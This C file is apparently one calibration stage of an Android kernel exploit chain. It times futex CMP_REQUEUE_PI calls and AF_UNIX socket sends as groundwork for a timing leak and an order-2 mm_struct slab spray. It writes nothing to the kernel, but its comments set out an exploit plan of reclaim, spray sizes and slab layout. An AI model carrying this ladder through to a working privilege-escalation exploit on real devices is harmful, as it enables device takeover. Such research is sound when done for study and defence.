/*
 * ghostlock_leak_cal.c — step 3 of the ladder (timing-only calibrator).
 *
 * Measures ONLY syscall timings on paths already proven safe:
 *  - CMP_REQUEUE_PI with diverging cmpval -> EAGAIN (reachability check 3,
 *    7/7 PASS on device). No PI pair, no blocking, no reclaim.
 *  - socketpair + SO_SNDBUF + send 8K (spray timing, without forging anything).
 *
 * Does NOT create PI waiter, does NOT call WAIT_REQUEUE_PI, does NOT do cross LOCK_PI,
 * does NOT touch creds, does NOT write to kernel. Risk: same as gettimeofday
 * in a loop + EAGAIN. Zero timeout, no threads, no persistent fds.
 *
 * Build (NDK r29, ARM64, API 28, same recipe as reachability):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-clang \
 *     -O2 -Wall -Wextra -fPIE -pie ghostlock_leak_cal.c -o ghostlock_leak_cal
 * Run:
 *   adb push ghostlock_leak_cal /data/local/tmp/ && adb shell /data/local/tmp/ghostlock_leak_cal
 *   adb shell rm /data/local/tmp/ghostlock_leak_cal
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif

#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define NADDR 16
#define NITER 500
#define NROUND 7
#define NSEND 200

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static int cmp64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

int main(void) {
    static uint32_t probe[4096];
    uint32_t anchor = 0;
    uint64_t t[NITER];
    int anomalies = 0;

    /* pin CPU0: eliminate migration noise, same as aresin does */
    {
        cpu_set_t m;
        CPU_ZERO(&m);
        CPU_SET(0, &m);
        if (sched_setaffinity(0, sizeof(m), &m))
            printf("[warn] affinity errno=%d (proceeding without pin)\n", errno);
    }

    printf("[info] mm_struct stride=0x340 order=2 objs_per_slab=19 slab=0x4000 (ref build-aq DWARF + slub.c)\n");

    /* Test A: best-median of NROUND rounds per address.
     * Suppresses scheduling noise; hash signal appears as
     * consistently slower address. */
    for (int a = 0; a < NADDR; a++) {
        uint32_t *u = &probe[a * 256];
        uint64_t med[NROUND];
        for (int rd = 0; rd < NROUND; rd++) {
            for (int i = 0; i < NITER; i++) {
                uint64_t t0 = now_ns();
                errno = 0;
                long r = xfutex(u, FCRQ, 1, (void *)(uintptr_t)1, &anchor,
                                0xdeadbeef);
                uint64_t t1 = now_ns();
                if (r != -1 || errno != EAGAIN)
                    anomalies++;
                t[i] = t1 - t0;
            }
            qsort(t, NITER, sizeof(t[0]), cmp64);
            med[rd] = t[NITER / 2];
        }
        qsort(med, NROUND, sizeof(med[0]), cmp64);
        printf("[time] addr[%d] best_med=%llu med_of_med=%llu worst_med=%llu ns\n",
               a, (unsigned long long)med[0],
               (unsigned long long)med[NROUND / 2],
               (unsigned long long)med[NROUND - 1]);
    }
    printf("[check] EAGAIN anomalies=%d (want 0)\n", anomalies);

    /* Test B: AF_UNIX 8K spray timing, without forging any object.
     * Timing probe only. Reclaim of the order-2 mm slab needs 16 KiB
     * sends (see hazel-mm-struct-aquaman.md MM leak feasibility). */
    {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
            printf("[FAIL] socketpair errno=%d\n", errno);
            return 1;
        }
        int sndbuf = 1024 * 1024;
        setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        static char buf[8192];
        memset(buf, 0x41, sizeof(buf));
        uint64_t s2[NSEND];
        int wfail = 0;
        for (int i = 0; i < NSEND; i++) {
            uint64_t t0 = now_ns();
            ssize_t w = send(sv[0], buf, sizeof(buf), MSG_DONTWAIT);
            uint64_t t1 = now_ns();
            if (w != (ssize_t)sizeof(buf)) {
                /* buffer full: drain and continue, without failing */
                char dr[8192];
                while (recv(sv[1], dr, sizeof(dr), MSG_DONTWAIT) > 0)
                    ;
                wfail++;
            }
            s2[i] = t1 - t0;
        }
        qsort(s2, NSEND, sizeof(s2[0]), cmp64);
        printf("[spray] send8k min=%llu med=%llu max=%llu ns full_drains=%d\n",
               (unsigned long long)s2[0],
               (unsigned long long)s2[NSEND / 2],
               (unsigned long long)s2[NSEND - 1], wfail);
        close(sv[0]);
        close(sv[1]);
    }

    printf("[summary] anomalies=%d\n", anomalies);
    return anomalies ? 1 : 0;
}
